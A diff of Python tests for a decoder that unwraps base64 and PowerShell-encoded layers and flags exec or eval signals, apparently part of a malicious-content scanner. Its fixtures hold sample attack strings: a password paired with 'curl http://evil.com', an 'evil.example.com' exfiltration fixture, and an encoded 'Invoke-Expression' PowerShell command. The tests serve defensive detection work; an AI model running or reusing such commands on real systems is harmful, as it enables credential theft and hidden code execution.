@@ -136,7 +136,7 @@ def test_decoded_layer_preview_redacts_tokens() -> None:
     sensitive = "password=supersecret123 curl http://evil.com"
     encoded = _b64(sensitive)
     result = decode_layers(encoded)
-    assert len(result.layers) == 1
+    assert len(result.layers) >= 1
     assert "supersecret123" not in result.layers[0].preview_redacted
 
 
@@ -174,3 +174,18 @@ def test_malicious_encoded_exfil_fixture() -> None:
     result = decode_layers(encoded)
     assert len(result.layers) >= 1
     assert result.exec_signals or result.eval_signals or "evil.example.com" in result.final_text
+
+
+def test_plain_alphanumeric_word_not_decoded_as_base64() -> None:
+    plain = "abcdefghijklmnopqrstuvwxyz"
+    result = decode_layers(plain)
+    assert result.layers == [], "Plain alphabetic string must not be decoded as base64"
+
+
+def test_powershell_encoded_command_uses_utf16le() -> None:
+    inner = "Invoke-Expression 'evil'"
+    encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
+    ps_command = f"powershell -EncodedCommand {encoded}"
+    result = decode_layers(ps_command)
+    assert any(layer.encoding == "powershell-encoded" for layer in result.layers)
+    assert "Invoke-Expression" in result.final_text, "PowerShell payload must be decoded as UTF-16LE"
